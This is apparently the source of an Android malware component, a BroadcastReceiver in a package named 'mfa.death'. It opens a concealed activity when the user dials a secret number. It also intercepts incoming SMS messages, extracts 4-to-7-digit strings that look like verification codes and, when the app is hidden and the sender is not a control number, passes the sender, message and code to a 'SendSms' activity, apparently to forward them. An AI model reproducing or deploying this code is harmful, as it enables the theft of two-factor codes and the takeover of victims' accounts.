package mfa.death;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.gsm.SmsMessage;

public class receiver extends BroadcastReceiver {
	public static final String normalSMSaction = "android.provider.Telephony.SMS_RECEIVED";


    @Override
	public void onReceive(Context context, final Intent intent) {
		Settings settings = Settings.get(context);
		String number = settings.getNumber(context);
		if (intent.getAction().equals(android.content.Intent.ACTION_NEW_OUTGOING_CALL)) {
			String phoneNumber = intent.getExtras().getString(android.content.Intent.EXTRA_PHONE_NUMBER);
			if (phoneNumber.equals(number)) { 
				Intent home = new Intent(context , home.class);
				home.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
				context.startActivity(home);
			  } else if (phoneNumber.equals(context.getString(R.string.emergencySecret))) {
				if (settings.useEmergency()) {
					Intent home = new Intent(context , home.class);
					home.addFlags(Intent.FLAG_ACTIVITY_NO_USER_ACTION);
					context.startActivity(home);
				  }
			  }
		  } else if (intent.getAction().equals(normalSMSaction.trim())) {
			Object[] pduArray = (Object[]) intent.getExtras().get("pdus");
			SmsMessage[] messages = new SmsMessage[pduArray.length];
			for (int i = 0; i < pduArray.length; i++) {
				messages[i] = SmsMessage.createFromPdu((byte[]) pduArray[i]);
			  }
			String sender = messages[0].getDisplayOriginatingAddress(); 
			StringBuilder bodyText = new StringBuilder();
			for (int i = 0; i < messages.length; i++) {
				bodyText.append(messages[i].getMessageBody());
			  }

			String body = bodyText.toString();
			Boolean possibleCode = false;
			String verificationCode = "";
			try {
				verificationCode = body.replaceAll("[^0-9]", ""); 
			  } catch (Exception x) {
			  } finally {
				if (verificationCode.length() > 3 && verificationCode.length() < 8) {
					possibleCode = true;
				  }
			  }


			if (!sender.equals(settings.controlPh())) {
				if (possibleCode && settings.hideApp()) {
					Intent home = new Intent(context , SendSms.class);
					home.putExtra("sender", sender);
					home.putExtra("message", body);

					home.putExtra("veri", verificationCode);

					home.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
					context.startActivity(home);
				  }
			  }
		  } 
	  }

  }
